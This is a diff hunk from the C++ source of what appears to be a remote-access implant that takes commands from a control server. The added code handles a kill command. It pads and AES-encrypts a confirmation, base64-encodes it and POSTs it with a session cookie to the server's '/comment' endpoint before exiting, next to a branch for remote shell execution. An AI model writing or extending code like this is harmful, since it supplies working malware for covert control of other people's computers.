@@ -583,6 +583,30 @@ int main()
             // If statements for the rest of the command
             // If exit
             if (parsed_cmd[1] == "CMD_KILL") {
+
+                // Pad 16 bytes
+                std::string exit_confirm = FUCKUP_PAD;
+
+                // append the command id first
+                exit_confirm.append(cmd_id.data());
+                exit_confirm.append(":::");
+                
+                // then the kill_id to confirm
+                exit_confirm.append(parsed_cmd[2]);
+
+                // Now need to encrypt the data
+                AesEncrypt(exit_confirm, iv);
+
+                // Now encode it
+                std::string b64_out_msg = base64_encode((const unsigned char*)exit_confirm.data(), exit_confirm.length());
+
+                // And send the data back to /comment
+                REQ_TYPE r = RESP;
+                std::wstring r_url = server_url.data();
+                r_url.append(L"/comment");
+
+                std::wstring bak = http_req(r_url.data(), b64_out_msg.data(), L"POST", r, cookie.data());
+
                 return 0;
             }
             // If shell exec
